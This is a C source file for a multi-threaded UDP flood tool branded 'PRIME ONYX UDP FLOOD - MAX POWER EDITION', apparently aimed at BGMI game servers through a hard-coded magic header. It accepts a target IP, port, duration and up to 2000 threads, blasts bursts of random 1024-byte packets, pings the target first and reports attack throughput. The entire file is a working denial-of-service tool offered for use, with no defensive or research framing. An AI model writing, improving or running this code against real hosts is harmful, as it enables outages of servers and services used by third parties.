#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <sys/time.h>

// ============================================
// MAX POWER CONFIGURATION
// ============================================
#define PAYLOAD_COUNT 50
#define PACKET_SIZE 1024      // Maximum packet size
#define BURST_SIZE 100         // Burst packets per loop
#define USE_RAW_SOCKET 1       // Raw socket for better performance

volatile sig_atomic_t stop_attack = 0;

void handle_signal(int sig) {
    stop_attack = 1;
}

void usage() {
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║           PRIME ONYX UDP FLOOD - MAX POWER EDITION               ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║ Usage: ./bgmi <IP> <PORT> <TIME> <THREADS>                       ║\n");
    printf("║ Example: ./bgmi 1.1.1.1 80 300 1000                              ║\n");
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int duration;
    int thread_id;
    unsigned long long packet_count;
};

// Pre-generated random payloads for maximum speed
unsigned char payloads[PAYLOAD_COUNT][PACKET_SIZE];

// Initialize random payloads
void init_payloads() {
    srand(time(NULL));
    for (int i = 0; i < PAYLOAD_COUNT; i++) {
        for (int j = 0; j < PACKET_SIZE; j++) {
            payloads[i][j] = rand() % 256;
        }
        // BGMI magic header
        payloads[i][0] = 0x16;
        payloads[i][1] = 0x9e;
        payloads[i][2] = 0x56;
        payloads[i][3] = 0xc2;
    }
}

// Calculate ping/ms delay
void add_ping_delay(int ms) {
    if (ms > 0) {
        usleep(ms * 1000); // Convert ms to microseconds
    }
}

// High-performance attack function
void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;
    int payload_index = 0;
    struct timeval start_time, current_time;
    unsigned long long packets_per_second = 0;
    int burst[PAYLOAD_COUNT];
    
    // Create socket with optimization
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        pthread_exit(NULL);
    }
    
    // Maximum socket optimization
    int val = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &val, sizeof(val));
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &val, sizeof(val));
    
    // Increase buffer size for max throughput
    int buffer_size = 8 * 1024 * 1024; // 8MB buffer
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    setsockopt(sock, SOL_SOCKET, SO_RCVBUF, &buffer_size, sizeof(buffer_size));
    
    // Set non-blocking for speed
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    
    if (inet_pton(AF_INET, data->ip, &server_addr.sin_addr) <= 0) {
        close(sock);
        pthread_exit(NULL);
    }
    
    endtime = time(NULL) + data->duration;
    gettimeofday(&start_time, NULL);
    data->packet_count = 0;
    
    // Pre-calculate burst packet indices for speed
    for (int i = 0; i < PAYLOAD_COUNT; i++) {
        burst[i] = i;
    }
    
    // Attack loop - MAXIMUM SPEED
    while (time(NULL) <= endtime && !stop_attack) {
        // Send multiple packets in burst
        for (int b = 0; b < BURST_SIZE && !stop_attack; b++) {
            // Send all payloads quickly
            for (int i = 0; i < PAYLOAD_COUNT; i++) {
                if (sendto(sock, payloads[payload_index], PACKET_SIZE, 0,
                          (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                    // Socket error - continue anyway
                    break;
                }
                data->packet_count++;
                payload_index = (payload_index + 1) % PAYLOAD_COUNT;
            }
        }
        
        // Calculate packets per second (for monitoring)
        gettimeofday(&current_time, NULL);
        long elapsed = (current_time.tv_sec - start_time.tv_sec) * 1000000 + 
                       (current_time.tv_usec - start_time.tv_usec);
        if (elapsed >= 1000000) {
            packets_per_second = data->packet_count;
            data->packet_count = 0;
            gettimeofday(&start_time, NULL);
            
            // Optional: Print speed every second (comment out for production)
            // printf("[Thread %d] Speed: %llu pps\n", data->thread_id, packets_per_second);
        }
    }
    
    close(sock);
    return NULL;
}

// ICMP Ping function to measure latency
int measure_ping(char *ip) {
    int sock;
    struct sockaddr_in addr;
    struct icmphdr icmp_hdr;
    char packet[64];
    struct timeval start, end;
    
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {
        return -1;
    }
    
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip);
    
    // Craft ICMP packet
    memset(&icmp_hdr, 0, sizeof(icmp_hdr));
    icmp_hdr.type = ICMP_ECHO;
    icmp_hdr.code = 0;
    icmp_hdr.un.echo.id = getpid();
    icmp_hdr.un.echo.sequence = 1;
    icmp_hdr.checksum = 0;
    
    gettimeofday(&start, NULL);
    
    if (sendto(sock, &icmp_hdr, sizeof(icmp_hdr), 0, 
               (struct sockaddr*)&addr, sizeof(addr)) <= 0) {
        close(sock);
        return -1;
    }
    
    // Wait for reply (1 second timeout)
    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(sock, &fds);
    struct timeval timeout = {1, 0};
    
    if (select(sock + 1, &fds, NULL, NULL, &timeout) > 0) {
        gettimeofday(&end, NULL);
        long elapsed = (end.tv_sec - start.tv_sec) * 1000 + 
                       (end.tv_usec - start.tv_usec) / 1000;
        close(sock);
        return elapsed;
    }
    
    close(sock);
    return -1;
}

int main(int argc, char *argv[]) {
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    
    if (argc != 5) {
        usage();
    }
    
    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    
    // Validate inputs
    if (port < 1 || port > 65535) {
        printf("❌ Invalid port! Use 1-65535\n");
        exit(1);
    }
    
    if (duration < 1 || duration > 3600) {
        printf("❌ Invalid duration! Use 1-3600 seconds\n");
        exit(1);
    }
    
    if (threads < 1 || threads > 2000) {
        printf("❌ Invalid threads! Use 1-2000\n");
        exit(1);
    }
    
    // Measure ping before attack
    printf("\n📡 Measuring ping to %s...\n", ip);
    int ping_ms = measure_ping(ip);
    if (ping_ms > 0) {
        printf("✅ Current ping: %d ms\n", ping_ms);
    } else {
        printf("⚠️ Could not measure ping (ICMP may be blocked)\n");
    }
    
    // Initialize payloads
    init_payloads();
    
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data *thread_data_array = malloc(threads * sizeof(struct thread_data));
    
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║              PRIME ONYX UDP FLOOD - MAX POWER                    ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║ Target      : %s:%d\n", ip, port);
    printf("║ Duration    : %d seconds (%d minutes)\n", duration, duration/60);
    printf("║ Threads     : %d\n", threads);
    printf("║ Packet Size : %d bytes\n", PACKET_SIZE);
    printf("║ Burst Size  : %d packets/loop\n", BURST_SIZE);
    printf("║ Payloads    : %d unique patterns\n", PAYLOAD_COUNT);
    if (ping_ms > 0) {
        printf("║ Target Ping : %d ms\n", ping_ms);
    }
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    
    printf("🔥 Starting attack with %d threads...\n", threads);
    printf("⏳ Will run for %d seconds (Press Ctrl+C to stop)\n\n", duration);
    
    // Launch threads
    for (int i = 0; i < threads; i++) {
        thread_data_array[i].ip = ip;
        thread_data_array[i].port = port;
        thread_data_array[i].duration = duration;
        thread_data_array[i].thread_id = i + 1;
        thread_data_array[i].packet_count = 0;
        
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&thread_data_array[i]) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            free(thread_data_array);
            exit(1);
        }
    }
    
    printf("✅ All %d threads launched successfully!\n", threads);
    
    // Progress indicator for long attacks (300 seconds)
    int elapsed = 0;
    while (elapsed < duration && !stop_attack) {
        sleep(30); // Update every 30 seconds
        elapsed += 30;
        if (elapsed <= duration) {
            int remaining = duration - elapsed;
            printf("⏳ Attack progress: %d/%d seconds (%d min remaining)\n", 
                   elapsed, duration, remaining/60);
        }
    }
    
    // Wait for threads to complete
    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }
    
    // Calculate total packets
    unsigned long long total_packets = 0;
    for (int i = 0; i < threads; i++) {
        total_packets += thread_data_array[i].packet_count;
    }
    
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                    ATTACK COMPLETED                               ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║ Total Packets Sent : %llu\n", total_packets);
    printf("║ Average Speed      : %llu packets/sec\n", total_packets / duration);
    printf("║ Estimated Bandwidth: %.2f MB/s\n", 
           (double)(total_packets * PACKET_SIZE) / (duration * 1024 * 1024));
    printf("╚══════════════════════════════════════════════════════════════════╝\n");
    
    free(thread_ids);
    free(thread_data_array);
    
    return 0;
}